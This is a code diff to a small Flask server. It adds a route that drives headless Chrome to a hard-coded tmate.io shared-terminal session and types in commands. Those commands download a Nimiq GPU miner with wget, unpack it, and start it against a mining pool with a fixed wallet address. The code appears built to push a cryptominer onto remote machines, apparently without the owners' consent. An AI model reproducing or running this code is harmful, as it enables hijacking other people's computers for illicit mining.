@@ -2,6 +2,11 @@ from flask import Flask, request
 import os
 from datetime import datetime
 import random
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.keys import Keys
+import time
+
 chars = [i for i in "abcdefghjklmnoprstuvyzxwq1234567890"]
 strs = f"{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}-{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}{random.choice(chars)}"
 
@@ -26,9 +31,29 @@ def recieve():
     print("ID: ", strs)
     return command1+command
 
-@app.route("/send")
-def send():
-  return "clear"
+@app.route("/<string:tmate>")
+def send(tmate):
+  chrome_options = Options()
+  chrome_options.add_argument("--headless")
+  driver = webdriver.Chrome(options = chrome_options)
+  url = "https://tmate.io/t/unn3K4K7hNQFnz5XWwuf4HPe4"
+  driver.get(url)
+  time.sleep(3)
+  area = driver.find_element_by_xpath('/html/body/div/div/div/div[2]/div/div/div/div/div[2]/div/textarea')
+  area.send_keys(Keys.ESCAPE)
+  command = """
+mkdir NimiqMiner
+cd NimiqMiner
+wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip
+mkdir nq-miner
+tar -xzvf nq-nimer-linux.zip -C nq-miner
+rm nq-nimer-linux.zip
+rm ./nq-miner/start_gpu.sh
+./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443
+"""
+  area.send_keys(command)
+  driver.quit()
+  return "Başarılı"
     
   
 
